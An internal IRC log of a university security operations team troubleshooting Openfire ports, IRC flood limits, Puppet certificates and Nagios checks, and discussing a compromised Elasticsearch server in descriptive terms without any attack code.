2014-07-08 14:57:46	wardog	Right. I wanted that open to teh world
2014-07-08 14:57:47	soehlert	i was asking if i should keep in the http(s) proxy ports
2014-07-08 14:58:01	wardog	5223:5269:7443 and now 7777 as well
2014-07-08 14:58:13	jazoff	unless they have a web based chat installed somewhere they dont need 7443
2014-07-08 14:58:16	soehlert	those are open to the world? and 909(0|1) to ncsa
2014-07-08 14:58:25	soehlert	jazoff: they very well might
2014-07-08 14:58:37	jazoff	ah
2014-07-08 14:58:43	jazoff	I always tried to get one going, but most sucked
2014-07-08 14:58:56	soehlert	wait...5269? i see that nowhere in the docs for openfire. i see 5222 though..
2014-07-08 14:59:10	wardog	5269 is XMPP server to server
2014-07-08 14:59:29	wardog	I suppose we don't really need it.
2014-07-08 14:59:58	soehlert	the docs for 5222 say:"The standard port for clients to connect to the server. Connections may or may not be encrypted. You can update the security settings for this port.     "
2014-07-08 15:00:01	jazoff	you can see in the server status if there are currently any S2S connectiosn open
2014-07-08 15:00:03	soehlert	seems like we need that one
2014-07-08 15:00:17	soehlert	jazoff: we'd need historical data as people may not always be connected
2014-07-08 15:00:52	jazoff	ah, i can check the bro logs actually
2014-07-08 15:00:56	jazoff	what's the ip of the server?
2014-07-08 15:01:12	soehlert	141.142.148.112
2014-07-08 15:04:58	wardog	Looks like openfire has an option to enable SSL on 5222. Not sure if that's enforced or just and option for the client.
2014-07-08 15:05:16	soehlert	i would imagine 5223 is the ssl version port
2014-07-08 15:05:28	wardog	5223 is definately SSL full time.
2014-07-08 15:05:41	soehlert	so 5222 is probably the non ssl connection. 
2014-07-08 15:06:07	jazoff	yeah.. xmpp has an "old style" ssl thing
2014-07-08 15:06:16	jazoff	i think it was similar to starttls or something
2014-07-08 15:06:51	jazoff	does anyone use that server currently?
2014-07-08 15:07:08	soehlert	dunno...wardog?
2014-07-08 15:07:21	jazoff	(i'm not seeing anything in the logs)
2014-07-08 15:07:33	soehlert	i assumed thats why you asked
2014-07-08 15:08:20	jazoff	for all of 2014 so far bro only has known_services log entries for 20,80,443
2014-07-08 15:08:37	soehlert	well that seems...weird. 22?
2014-07-08 15:08:44	jazoff	er, 22 yeah
2014-07-08 15:17:05	wardog	odd.
2014-07-08 15:17:14	wardog	I know people connect to blizzard
2014-07-08 15:17:24	wardog	Uh.
2014-07-08 15:17:32	wardog	The old jabber server is on blizzard
2014-07-08 15:17:38	wardog	141.142.148.14
2014-07-08 15:17:42	soehlert	ahhh whoops my bad
2014-07-08 15:17:51	soehlert	the wiki is on the other one..
2014-07-08 15:17:58	wardog	:D
2014-07-08 15:19:58	jazoff	sighhhhh :)
2014-07-08 15:20:03	soehlert	muh bad
2014-07-08 15:21:03	jazoff	that's better :)
2014-07-08 15:22:24	jazoff	Date first seen          Duration Proto          Dst Port    Flows(%)     Packets(%)       Bytes(%)         pps      bps   bpp
2014-07-08 15:22:28	jazoff	2014-06-30 00:00:34.832 745729.413 any                5222    20506( 4.6)    71924( 9.8)    8.1 M(16.1)        0       86   111
2014-07-08 15:22:31	jazoff	2014-06-30 11:25:41.597 700062.689 any                6697     4497( 1.0)    12175( 1.7)    1.4 M( 2.9)        0       16   117
2014-07-08 15:22:34	jazoff	2014-07-01 13:45:58.015 606024.898 any                9091     3324( 0.7)    96412(13.2)    9.3 M(18.6)        0      122    96
2014-07-08 15:22:37	jazoff	2014-07-01 13:53:55.633 604767.402 any                9090     2080( 0.5)    69507( 9.5)    6.0 M(12.0)        0       79    86
2014-07-08 15:22:41	jazoff	2014-07-01 14:03:09.208 603090.893 any               43505      674( 0.2)     2060( 0.3)   119396( 0.2)        0        1    57
2014-07-08 15:22:44	jazoff	2014-07-01 01:37:04.052 653521.833 any                5223     1959( 0.4)    11032( 1.5)    1.0 M( 2.0)        0       12    91
2014-07-08 15:22:47	jazoff	2014-07-01 13:58:05.695 604518.099 any                7443     1927( 0.4)    32600( 4.5)    3.1 M( 6.2)        0       40    94
2014-07-08 15:22:51	jazoff	2014-07-01 00:02:43.502 658875.913 any                 123     1295( 0.3)     1326( 0.2)    99471( 0.2)        0        1    75
2014-07-08 15:22:54	jazoff	2014-07-01 13:51:31.470 604911.760 any                7070      659( 0.1)    12695( 1.7)    1.5 M( 3.0)        0       19   116
2014-07-08 15:22:58	jazoff	2014-07-01 13:53:01.521 602869.320 any               50122      328( 0.1)      438( 0.1)    25320( 0.1)        0        0    57
2014-07-08 15:23:01	jazoff	oh, but that was top 10
2014-07-08 15:23:14	jazoff	either way, looks like 5222 is the important one at least
2014-07-08 16:38:06	jazoff	oh.. you may not want to open the 9090 port
2014-07-08 16:38:21	jazoff	it doesn't redirect to 9091, so it ends up sending plain text creds
2014-07-09 08:42:37	jazoff	well, I think i added the bhr queue check to nagios
2014-07-09 08:42:41	jazoff	at least, I added it in 3 places
2014-07-09 09:01:08	wardog	Should BWAM-2503 be reassigned to brett or someone else?
2014-07-09 09:01:25	wardog	https://jira.ncsa.illinois.edu/browse/BWAM-2503
2014-07-09 09:03:18	jazoff	well, at this point it's been a week, so it might need to be unlocked again
2014-07-09 09:07:39	jazoff	no hits in splunk in the last 7 days for becklehi
2014-07-09 09:44:01	soehlert	im not sure what to do about that wardog. it was an urgent issue, that i fixed, now it's been over a week and he hasn't signed in so he's been locked out again..
2014-07-09 09:44:15	soehlert	aaaand jazoff already figured that out..
2014-07-09 09:44:19	wardog	:)
2014-07-09 09:44:29	wardog	Just wondering if the ticket had to be in Brett's court, is all.
2014-07-09 09:44:48	wardog	It's currently assigned to 'Security List'
2014-07-09 09:45:04	soehlert	right. i guess i could reassign it and let brett know what's going on
2014-07-09 09:45:36	wardog	I'm actually surprised he hasn't dinged us on it yet. He usually likes to let us know when tickets are still open.
2014-07-09 09:45:46	soehlert	ya i know
2014-07-09 09:45:49	wardog	Not that there's anything we can do about it.
2014-07-09 09:46:06	soehlert	i was kinda hoping he would jsut so he knew it was the users fault and not ours
2014-07-09 09:46:20	soehlert	ill give him a more active kick in the pants though..
2014-07-09 09:47:16	wardog	Oh, did you see the note from muggli?
2014-07-09 09:47:38	soehlert	ya i'll take care of it in a minute, presuming he means he needs an account. i don't know what ACL he's talking about
2014-07-09 09:49:10	soehlert	that and idk why he's mentioning tim bouvet and the vsphere client. weird way to request it..
2014-07-09 09:51:31	wardog	Makes me think of my kids. "I want what he wants"
2014-07-09 10:32:14	jazoff	ooh, the 'check bhr queue size' shows up in nagios now
2014-07-09 10:32:18	jazoff	must have done something right
2014-07-09 11:38:47	soehlert	grrr stupid openfire. it starts up and says admin console listening on port 9090. but it 404's even from wiki-sec itself.
2014-07-09 11:42:59	jazoff	oh?
2014-07-09 11:43:16	jazoff	worked for me
2014-07-09 11:43:23	soehlert	wait what? you can get to it right now?
2014-07-09 11:43:32	jazoff	http://wiki-sec.ncsa.illinois.edu:9090/
2014-07-09 11:43:45	jazoff	redirects to http://wiki-sec.ncsa.illinois.edu:9090/setup/index.jsp
2014-07-09 11:43:46	soehlert	what the hell now it works for me too!
2014-07-09 11:43:53	jazoff	ha!
2014-07-09 11:43:58	jazoff	for once I fixed something by looking at it
2014-07-09 11:44:16	soehlert	it most certainly 404'd even with lynx on wiki-sec itself pointing to 127.0.0.1:9090
2014-07-09 11:44:16	soehlert	ugh whatever..good work!
2014-07-09 11:44:40	jazoff	oh, that may be because of something their http server is donig when it sees 127.0.0.1
2014-07-09 11:45:06	soehlert	i wouldn't think so since it says:
2014-07-09 11:45:08	soehlert	Openfire 3.9.1 [Jul 9, 2014 11:24:37 AM]
2014-07-09 11:45:08	soehlert	Admin console listening at http://127.0.0.1:9090
2014-07-09 11:45:18	jazoff	odd
2014-07-09 11:45:35	soehlert	whatever, works now.
2014-07-09 11:58:47	jazoff	ah, forgot to eat again
2014-07-09 11:59:17	jazoff	eyrich: do we reboot cygnus or does neteng?
2014-07-09 11:59:28	soehlert	neteng
2014-07-09 11:59:50	jazoff	now that I have the bhr queue stuff working it couldn't hurt to reboot it at some point
2014-07-09 12:00:01	jazoff	i'm sure there are still some things broken after it ran out of ram
2014-07-09 12:05:52	wardog	jazoff: fyi, Deanna will *book* the room for you. You'll still have to pay for it on site and need to submit a reimbursement form for it later.
2014-07-09 12:06:00	jazoff	oh, that's fine
2014-07-09 12:06:07	wardog	Just so you know
2014-07-09 12:06:32	soehlert	ya they didn't tell me that right before i showed up in San Diego for my 400 dollar a night room..
2014-07-09 12:06:40	soehlert	for a week long stay.
2014-07-09 12:06:52	jazoff	just think of all the credit card points you got
2014-07-09 12:06:54	wardog	Sounds like a lot of points on your card!
2014-07-09 12:06:57	wardog	heh
2014-07-09 12:07:15	soehlert	my card at the time had a low limit..had to shuffle some cash around.
2014-07-09 12:29:22	soehlert	openfire does it's set up really effin stupidly. the last step is to create an admin user. it asks for and email and a password. it wouldn't let me log in. finally i saw someone else figured out you have to log in with the username of admin and NOT the email they just had you enter.
2014-07-09 12:37:42	jazoff	yeah.. the email is just for user info
2014-07-09 12:38:02	soehlert	they sure lead you to believe otherwise...sigh. 
2014-07-09 12:38:11	jazoff	also depends if you setup ldap or not
2014-07-09 12:38:20	jazoff	then you need to login with the ldap creds for the user you told it was an admin
2014-07-09 12:39:07	soehlert	right i saw that
2014-07-09 12:48:34	jazoff	i think the first time I setup ldap i immediately locked myself out :)
2014-07-09 12:48:54	soehlert	hah live and learn right
2014-07-09 12:48:55	jazoff	one thing I think you can do, is take the conf file it generates and put it in puppet, or at least the git/wiki thing
2014-07-09 12:49:09	jazoff	that way re-setting it up is easier
2014-07-09 12:49:13	soehlert	well once i get around to puppetizing these things, i will do that
2014-07-09 12:49:48	jazoff	I originally wanted to use ejabbberd because of that (config file is plain text and easier to bootstrap) but it was harder to configure in the first place
2014-07-09 12:51:13	soehlert	i keep seeing people moving to hipchat, have you ever trie dthat?
2014-07-09 12:52:29	jazoff	no
2014-07-09 12:52:56	jazoff	there are lots of web based chat stuffs these days
2014-07-09 12:53:07	jazoff	annoying that i dont think any support xmpp or irc as well
2014-07-09 12:55:26	soehlert	ahh gotcha
2014-07-09 12:56:49	jazoff	apparently there is a bitlbee plugin though
2014-07-09 12:57:40	jazoff	I don't mind IRC, just need to figure out why the bot is rate limited
2014-07-09 12:57:53	soehlert	hah ya
2014-07-09 12:58:08	jazoff	oh, i know how I was going to figure that out...
2014-07-09 12:58:16	soehlert	hows that?
2014-07-09 12:58:18	jazoff	I just need to paste something big from irssi and see if it shows up as rate limited to you
2014-07-09 12:58:30	soehlert	lets do it
2014-07-09 13:00:03	jazoff	ok, pasted 20 lines
2014-07-09 13:00:22	soehlert	i see 20
2014-07-09 13:00:29	jazoff	did they show up all at once?
2014-07-09 13:00:34	soehlert	ya
2014-07-09 13:00:47	jazoff	ok, must be something in the irc code in the bot
2014-07-09 13:00:50	soehlert	wait no
2014-07-09 13:01:05	soehlert	12:59:24 13:00:00
2014-07-09 13:01:09	jazoff	IRC is weird in that the server doesn't send you your own messages
2014-07-09 13:01:17	jazoff	so I can't see how long they take to show up
2014-07-09 13:01:27	soehlert	i just gave you the start and end times
2014-07-09 13:02:03	jazoff	ah, and the timestamps are local too
2014-07-09 13:02:10	jazoff	so, it IS something the server is doing
2014-07-09 13:11:00	jazoff	ok.. time to dig into Unreal3.2.8.1
2014-07-09 13:16:36	jazoff	was that built from src?
2014-07-09 13:17:02	jazoff	apparently 3.2.8.1 had a backdoor briefly
2014-07-09 13:17:42	soehlert	im guessing it was
2014-07-09 13:17:42	soehlert	and yikes
2014-07-09 13:17:53	jazoff	"between November 2009 and June 12th 2010"
2014-07-09 13:17:55	jazoff	so i guess we are ok
2014-07-09 13:21:25	jazoff	i think it's recvq
2014-07-09 13:21:26	jazoff	recvq specifies the amount of data which can be in the receive queue and is used for flood control (this only applies to normal users, try experimenting with values 3000-8000, 8000 is the default).
2014-07-09 13:21:37	soehlert	ahh
2014-07-09 13:22:27	jazoff	it appearts to be set to recvq 32000
2014-07-09 13:22:45	jazoff	which seems like it should be enough...
2014-07-09 13:23:16	soehlert	i would think so
2014-07-09 13:23:29	jazoff	but maybe it just needs to be 10x that
2014-07-09 13:24:56	jazoff	same with sendq I guess too
2014-07-09 13:25:06	soehlert	ya
2014-07-09 13:33:27	jazoff	intesrting that if you build it now, it defaults to 3000000 for sendq
2014-07-09 13:33:35	soehlert	hah well then..
2014-07-09 13:44:00	wardog	no whip around. working on the secops preso for xsede.
2014-07-09 13:44:18	soehlert	i was just about to ask if we could do that
2014-07-09 13:45:22	wardog	go eat
2014-07-09 13:46:20	soehlert	yes boss
2014-07-09 14:07:24	eyrich	jazoff: neteng - specifically kollros
2014-07-09 16:01:24	jazoff	so I ran unrealircd in a docker container..
2014-07-09 16:01:27	jazoff	does the same rate limiting
2014-07-09 16:18:03	jazoff	seems like every ircd does that... lame
2014-07-09 16:25:08	jazoff	ah, charybdis works the same way by default, but has settings that change things
2014-07-09 16:46:40	jazoff	might be worthwhile switching, especially since the one we are running was installed from source and not getting updates
2014-07-10 09:50:13	soehlert	jazoff: we can do that when we rebuild the irc server
2014-07-10 09:51:49	jazoff	works for me :)
2014-07-10 09:52:05	jazoff	it's kinda surprising that it seems most irc servers have such aggressive flood protection on by default
2014-07-10 09:52:16	jazoff	sometimes built into the binary based on defines in C code
2014-07-10 09:53:03	soehlert	that does seem a bit much
2014-07-10 09:54:02	jazoff	most of the forum/email threads I fould were from similar situations as this..
2014-07-10 09:54:12	soehlert	hah nice
2014-07-10 09:54:13	jazoff	"We have an internal irc server how do we turn off the rate limiting?
2014-07-10 09:54:29	soehlert	i get the point of making it a default or something, but it should be configurable
2014-07-10 09:59:58	jazoff	yeah.. was easy enougn in charybdis
2014-07-10 10:00:46	soehlert	was it easy enough to install?
2014-07-10 10:03:30	jazoff	yeah, though i was poking around on an ubuntu container
2014-07-10 10:03:39	soehlert	fair enough
2014-07-10 10:03:45	soehlert	thanks for looking into that
2014-07-10 10:03:48	jazoff	seeing what centos has
2014-07-10 10:04:24	jazoff	meh
2014-07-10 10:04:25	jazoff	ircd-hybrid.x86_64 : Internet Relay Chat Server
2014-07-10 10:04:25	jazoff	ngircd.x86_64 : Next Generation IRC Daemon
2014-07-10 10:04:48	jazoff	ngircd has it compiled in from what I could tell, not sure about hybrid, it had the same problem but I didn't see an option
2014-07-10 10:05:16	soehlert	oh wait charybdis doesn't work on centos? is that what you're saying?
2014-07-10 10:05:28	jazoff	it's not in the main or epel repos
2014-07-10 10:05:40	jazoff	not that it wouldn't work, just looking for something supported
2014-07-10 10:06:02	soehlert	ya that would be better
2014-07-10 10:18:44	jazoff	ngircd is a bit better though
2014-07-10 10:18:53	jazoff	looks like by default it lets you burst like 10 messages and then it sends 3/sec after that
2014-07-10 10:19:17	soehlert	but you cant pull off rate limiting totally?
2014-07-10 10:20:11	jazoff	dunno yet.. that was charybdis that had it as an option
2014-07-10 10:20:43	soehlert	well i get that i was asking about ngircd
2014-07-10 10:22:56	jazoff	no.. loosk like it is harccoded
2014-07-10 10:22:57	jazoff	conn.c:#define MAX_COMMANDS 3
2014-07-10 10:23:01	jazoff	that must be it
2014-07-10 10:23:08	soehlert	damn
2014-07-10 10:23:36	jazoff	that's at least 3x faster than what we have now :)
2014-07-10 10:36:37	jazoff	i suppose we could easily rebuild the rpm for ngircd, and then just keep an eye out for updates
2014-07-10 10:36:57	jazoff	will have to check ircd-hybrid next, maybe that has options for this
2014-07-10 11:20:29	soehlert	so for rebuilding seclogs...i should theoretically be able to just do it and the relays will buffer right?
2014-07-10 11:21:01	jazoff	in theory there is no difference between theory and practice, in practice there is :)
2014-07-10 11:21:24	soehlert	ya ya ya. stupid practice..
2014-07-10 11:32:03	jazoff	i guess the main thing to watch out for is the syslog daemon coming up briefly with the wrong config
2014-07-10 11:32:33	soehlert	ooo right...hmm actually i think i can set up a new box and all that. move it over to the right ip after it's good to go
2014-07-10 11:32:48	jazoff	yeah, that should be safer
2014-07-10 15:02:20	jazoff	speaking of the log machines.. is thunder free now
2014-07-10 15:07:12	wardog	should be
2014-07-10 15:07:33	wardog	time machine, right?
2014-07-10 15:13:32	jazoff	yeah
2014-07-10 15:44:50	soehlert	will get to that at some point. probably not gonna be a high priority unless you have a good case for that
2014-07-10 15:57:37	jazoff	not hugely pressing, just would be nice to have
2014-07-10 16:02:17	soehlert	then you shall have...
2014-07-10 16:02:17	soehlert	eventually
2014-07-10 16:24:21	jazoff	:)
2014-07-11 08:42:50	wardog	Then the Lord sayeth, so be it.... just not yet...
2014-07-11 09:36:07	soehlert	working on sans stuff today i'll be checking in throughout the day though if anyone needs anything
2014-07-11 09:46:37	wardog	My box of SANS books are looming in a box on my desk...
2014-07-11 09:47:12	wardog	don't go back to writing a sentence after leaving it half finished 20 minutes earlier.
2014-07-11 10:23:40	soehlert	jazoff: last night i really got to appreciate the bwbh_user_check script. had those three tickets all at once. it's definitely easier with the script vs one ticket, but the script vs 3 tickets was awesome!
2014-07-11 10:26:21	jazoff	awesome :)
2014-07-11 10:26:39	jazoff	helpdesk must think you are superhuman :)
2014-07-11 10:40:11	wardog	w0t0
2014-07-11 10:40:15	jazoff	hah, y2k strikes again http://www.washingtonpost.com/news/post-nation/wp/2014/07/10/the-selective-service-just-reminded-14000-men-born-between-1893-and-1897-to-register-for-the-draft/
2014-07-11 10:40:20	wardog	...
2014-07-11 10:51:14	wardog	I assume seclogs was fixed yesterday?
2014-07-11 10:57:04	soehlert	wardog: was not. needed icepick around to change the switch port over for me. so i'll work on it monday
2014-07-11 10:58:12	wardog	Time to order lunch! http://www.amazon.com/Live-Lobster-1-1-lbs-Each/dp/B0000SX9UA
2014-07-11 12:36:59	soehlert	chromecast came in today. now i can lay in the recliner and cast the sans stuff to the tv and play the audio through the sound system. that's how you study folks.
2014-07-14 08:20:38	keist	howdy :)
2014-07-14 08:27:03	wardog	hello
2014-07-14 08:27:59	jazoff	hey hey
2014-07-14 08:28:07	jazoff	keist: when you get a chance, can you check the change I made to the nagios config
2014-07-14 08:28:11	jazoff	i think it did everything right
2014-07-14 09:05:18	keist	yep, I'll look
2014-07-14 09:05:29	keist	https://www.novainfosec.com/2014/07/14/lastpass-sadly-downplays-pair-of-year-old-vulnerabilities/
2014-07-14 09:20:04	keist	jazoff: looks good
2014-07-14 09:22:29	jazoff	awesome
2014-07-14 12:54:30	keist	should repo-sec not be monitored by nagios anymore?
2014-07-14 12:56:47	keist	brb, taking dog for a walk
2014-07-14 12:56:57	soehlert	it should be but its been moved...and dog?
2014-07-14 12:58:02	keist	family dog, still in Indiana. Back to CU tomorrow evening (sick day for doc appointment).
2014-07-14 12:58:24	keist	what's the new address?
2014-07-14 13:04:12	jazoff	doesn't it have the same hostname?
2014-07-14 13:04:29	jazoff	i think it just doesn't have NRPE installed?
2014-07-14 13:05:00	jazoff	repo-sec.ncsa.illinois.edu has address 141.142.148.26
2014-07-14 13:27:10	soehlert	jazoff got it. when i replace them they end up with the same hostname and ip
2014-07-14 13:46:27	keist	kk, waiting on NRPE then
2014-07-14 13:49:51	soehlert	[root@repo-sec ~]# ps aux | grep -i nrpe
2014-07-14 13:49:51	soehlert	nagios   15902  0.0  0.0  39356  1380 ?        Ss   Jul02   0:00 /usr/local/nagios/bin/nrpe -c /usr/local/nagios/etc/nrpe.cfg -d
2014-07-14 13:50:06	soehlert	i presumed you had to do something on the server to make it work..
2014-07-14 14:00:31	soehlert	jazoff: do you think we can virtualize the puppet master?
2014-07-14 14:08:23	keist	[root@repo-sec ~]# ss -n state listening '( sport = :5666 )'
2014-07-14 14:08:24	keist	Recv-Q Send-Q                                                                     Local Address:Port                                                                       Peer Address:Port 
2014-07-14 14:08:28	keist	0      5                                                                          10.142.148.94:5666                                                                                  *:*   
2014-07-14 14:08:53	keist	looks like you had an internal interface and then removed later so during install it picked it up
2014-07-14 14:09:17	keist	fixing now
2014-07-14 14:09:35	soehlert	that's gonna be an issue on a lot of them then
2014-07-14 14:09:35	soehlert	they need internal interfaces to kickstart.
2014-07-14 14:09:55	soehlert	but then they don't always need to have one after that
2014-07-14 14:10:55	jazoff	soehlert: probably.. though puppet enterprise is somewhat of a black box to me
2014-07-14 14:11:06	jazoff	regular puppetmaster is just a config directory and a daemon
2014-07-14 14:11:37	soehlert	hmm ok i need to rebuild it before we can convert more machiens. the license is starting to really screw us. trying to decide whether to find some hardware or just virtualize it.
2014-07-14 14:11:51	keist	well, not necessarily because puppet should run again and it should get the fact result post-interface change
2014-07-14 14:12:07	soehlert	not necessarily what?
2014-07-14 14:12:08	keist	but the catalog is erroring on repo-sec
2014-07-14 14:12:09	keist	[root@repo-sec ~]# puppet agent -t
2014-07-14 14:12:09	keist	Warning: Unable to fetch my node definition, but the agent run will continue:
2014-07-14 14:12:09	keist	Warning: Error 400 on SERVER: Could not retrieve facts for repo-sec.ncsa.illinois.edu: Failed to find facts from PuppetDB at squall.ncsa.illinois.edu:8081: SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read finished A
2014-07-14 14:12:17	jazoff	that's a new one
2014-07-14 14:12:21	soehlert	ya thats currently the issues on the puppet master
2014-07-14 14:12:27	soehlert	why i need to rebuild squall asap
2014-07-14 14:14:07	keist	manual change until then I suppose e.g.
2014-07-14 14:14:08	keist	[root@repo-sec ~]# grep server_address /usr/local/nagios/etc/nrpe.cfg 
2014-07-14 14:14:08	keist	server_address=141.142.148.26
2014-07-14 14:14:18	soehlert	k
2014-07-14 14:34:31	soehlert	jazoff: you ever moved the hardware your puppet master was on? i would imagine the CA stuff gets a little iffy
2014-07-14 14:35:50	jazoff	yeah..
2014-07-14 14:36:25	jazoff	found the script I ran..
2014-07-14 14:36:26	jazoff	looks like I did
2014-07-14 14:36:27	jazoff	mv /var/lib/puppet/ssl/ /var/lib/puppet/ssl.old
2014-07-14 14:36:27	jazoff	mv /etc/puppet/ssl /etc/puppet/ssl.old
2014-07-14 14:36:30	jazoff	and then re-ran puppet
2014-07-14 14:36:51	soehlert	thats on the client side?
2014-07-14 14:39:00	jazoff	yeah
2014-07-14 14:39:50	soehlert	does it change since i'll be changing the host name of the server?
2014-07-14 14:43:22	jazoff	that's what I was doing..
2014-07-14 14:43:29	soehlert	ok just verifying.
2014-07-14 14:43:39	jazoff	though that was with plain puppet, puppet enterprise deploys all that other stuff
2014-07-14 14:44:13	soehlert	ya im kinda worried, but thanks to the terrible help their service guy gave me, we're stuck in this hole as I can't get puppet to undo the thing that's causing failures all over the place now
2014-07-14 15:04:04	jazoff	puppetdb log is spitting out 2014-07-14 15:03:53,605 WARN  [qtp39500412-84] [io.nio] javax.net.ssl.SSLHandshakeException: null cert chain
2014-07-14 15:04:10	jazoff	though that is WARN
2014-07-14 15:17:21	jazoff	though definitely appears to be ssl related
2014-07-14 15:22:05	jazoff	hmm
2014-07-14 15:22:49	jazoff	there is a cert request for squall
2014-07-14 15:23:02	jazoff	ther used to be this:
2014-07-14 15:23:02	jazoff	[root@squall ~]# locate /etc/puppetlabs/puppet/ssl|grep squa
2014-07-14 15:23:02	jazoff	/etc/puppetlabs/puppet/ssl/ca/signed/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:02	jazoff	/etc/puppetlabs/puppet/ssl/certs/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:02	jazoff	/etc/puppetlabs/puppet/ssl/private_keys/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:05	jazoff	/etc/puppetlabs/puppet/ssl/public_keys/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:09	jazoff	but now there is
2014-07-14 15:23:09	jazoff	[root@squall ~]# find /etc/puppetlabs/puppet/ssl|grep squa
2014-07-14 15:23:10	jazoff	/etc/puppetlabs/puppet/ssl/certificate_requests/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:10	jazoff	/etc/puppetlabs/puppet/ssl/ca/requests/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:12	jazoff	/etc/puppetlabs/puppet/ssl/private_keys/squall.ncsa.illinois.edu.pem
2014-07-14 15:23:15	jazoff	/etc/puppetlabs/puppet/ssl/public_keys/squall.ncsa.illinois.edu.pem
2014-07-14 15:25:21	jazoff	hmm, signing it didn't help
2014-07-14 15:31:39	jazoff	weird, squall does this:
2014-07-14 15:31:40	jazoff	Warning: SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed: [certificate revoked for /CN=squall.ncsa.illinois.edu]
2014-07-14 15:47:47	jazoff	think we just need to regen all the certs and things will work again
2014-07-14 15:50:30	jazoff	at least, clearly if you are deleting all the certs and starting over there can't be any problems with the certs
2014-07-14 15:58:01	soehlert	jazoff: support told me the best way to handle the license issue was to turn off puppetdb manage_db but that caused these problems. then i tried going back and worrying about the license later but now its all sorts of jacked up. im headed to pcf to build a new puppet master
2014-07-14 15:58:18	soehlert	hopefully by EOB tomorrow we can begin moving our clients to the new one.
2014-07-14 15:58:26	jazoff	works for me :)
2014-07-14 15:58:31	soehlert	had to happen anyways cuz of centos
2014-07-14 15:58:38	soehlert	plus itll give me a chance to update puppet
2014-07-14 16:00:19	jazoff	suppose the only tricky thing is migrating the db
2014-07-14 17:40:05	soehlert	ya we'll see. I'll get through installing puppet tonight and then we can maybe work on getting that stuff sorted tomorrow. oh and we'll have to set up the cronjob git pull stuff.
2014-07-15 07:36:27	jazoff	brototype looks.. BROken
2014-07-15 09:04:25	jazoff	wardog: I added a report for that ES server to the new incident-reports repo
2014-07-15 09:04:37	jazoff	i took a closer look at it yesterday, the box was definitely compromised
2014-07-15 09:05:01	jazoff	no way to know what they did with it before their IP got BHRd though
2014-07-15 09:07:22	jazoff	('their' being the chinese host)
2014-07-15 09:08:52	jazoff	the iptables rules they showed are accepts.. most likely someone set their default policy to accept
2014-07-15 09:09:30	jazoff	though I'd also tell them that limiting it to the /16 is not really acceptable either
2014-07-15 09:09:52	wardog	thanks
2014-07-15 09:10:11	jazoff	since really anyone can just run one curl command and delete their entire index
2014-07-15 09:10:29	jazoff	ES is not supposed to be remotely accessible from anyone really
2014-07-15 09:54:03	jazoff	ah, brototype is out of memory
2014-07-15 09:54:08	jazoff	jazoff@bro-sandbox:~$ w
2014-07-15 09:54:08	jazoff	-bash: fork: Cannot allocate memory
2014-07-15 09:54:17	soehlert	uh oh
2014-07-15 09:54:17	soehlert	how much is in there
2014-07-15 09:56:03	soehlert	also jazoff, want a project to work on? involves bro...
2014-07-15 09:57:02	jazoff	i think like 64G or something insane
2014-07-15 09:57:07	jazoff	sure, what's up
2014-07-15 09:57:35	soehlert	damn...big memory leak?
2014-07-15 09:57:35	soehlert	and ive noticed that our sshd bro stuff doesn't show username when it comes from the bastions
2014-07-15 09:57:55	jazoff	oh?
2014-07-15 09:58:00	jazoff	it used to I take it?
2014-07-15 09:58:29	soehlert	im not sure. but it does when the alerts come from the login nodes
2014-07-15 09:58:57	wardog	The isshd stuff? I don't recall that having associated usernames
2014-07-15 09:59:10	soehlert	it should. it definitely does from the h2ologins
2014-07-15 10:13:35	jazoff	jazoff@bro-sandbox:~$ ps auxw|grep 'docker attach ab2d94e85ac0'  -c
2014-07-15 10:13:35	jazoff	3931
2014-07-15 10:13:39	jazoff	that probably has something to do with it
2014-07-15 10:14:07	jazoff	sudo pkill -f  'docker attach ab2d94e85ac0'
2014-07-15 10:14:10	jazoff	seems to have cleared that up
2014-07-15 10:15:00	jazoff	ah, the cron job is doing that
2014-07-15 10:15:07	jazoff	/msg soehlert echo 'echo "Warning: Container lifetime limit reached. Destroying container..."' | docker attach $ID
2014-07-15 10:15:11	jazoff	er, stupid irssi
2014-07-15 10:15:18	jazoff	echo 'echo "Warning: Container lifetime limit reached. Destroying container..."' | docker attach $ID
2014-07-15 10:15:24	jazoff	apparently that does not exit
2014-07-15 10:15:56	jazoff	commented that out for now
2014-07-15 10:16:16	soehlert	ahhh gotcha
2014-07-15 10:17:03	soehlert	wardog: apparently i didn't do https, but it redirects to https://tickets.ncsa.illinois.edu...ughhh why have two totally separate websites and with only ssl as the difference?!
2014-07-15 10:17:35	wardog	Fun
2014-07-15 10:27:32	jazoff	so.. are we going to tell that rob kooper guy that he needs to reinstall his server?
2014-07-15 10:27:50	soehlert	was he the one doing the ES?
2014-07-15 10:27:57	jazoff	yes
2014-07-15 10:28:06	wardog	They disabled ES
2014-07-15 10:28:15	wardog	It supposedly wasn't supposed to be running or open.
2014-07-15 10:28:22	jazoff	.. but after they were compromised
2014-07-15 10:28:38	soehlert	well if things we're always running as they were supposed to, we'd have very little to do ever
2014-07-15 10:31:11	jazoff	the attacker uploading a perl reverse shell client and ran it
2014-07-15 10:31:24	jazoff	i have no idea what if anything they did with it, but it connected back to them
2014-07-15 10:31:32	soehlert	damn
2014-07-15 10:31:47	wardog	I thought your note said it wasn't compromised. Was this something else?
2014-07-15 10:32:01	jazoff	i thought it didn't work, but I double checked and it did
2014-07-15 10:32:08	wardog	sigh
2014-07-15 10:32:42	jazoff	i think I was too specific with the timeframe in splunk with the search
2014-07-15 10:32:56	jazoff	since the connection would have been logged a bit later only when it was closed
2014-07-15 10:33:01	jazoff	but it was tehre
2014-07-15 10:35:55	wardog	How long before time machine is up? :)
2014-07-15 10:36:11	soehlert	shhh dont remind him
2014-07-15 10:36:14	jazoff	heh
2014-07-15 10:36:19	jazoff	yeah, it figures...
2014-07-15 10:36:22	soehlert	30697147
2014-07-15 10:36:25	wardog	SQUIRREL!
2014-07-15 10:36:28	soehlert	damn...wrong window
2014-07-15 10:36:31	jazoff	no need for it for months, then bam
2014-07-15 10:36:44	wardog	Well, at least it's on the roadmap
2014-07-15 10:36:49	jazoff	for all I know they connected, ran 'ps' and then sat there until they got BHR'd
2014-07-15 10:37:06	wardog	What triggered the BHR?
2014-07-15 10:37:28	jazoff	scanning for ES servers
2014-07-15 10:37:43	jazoff	they likely were just POSTing the command to any server they could find and see what happens
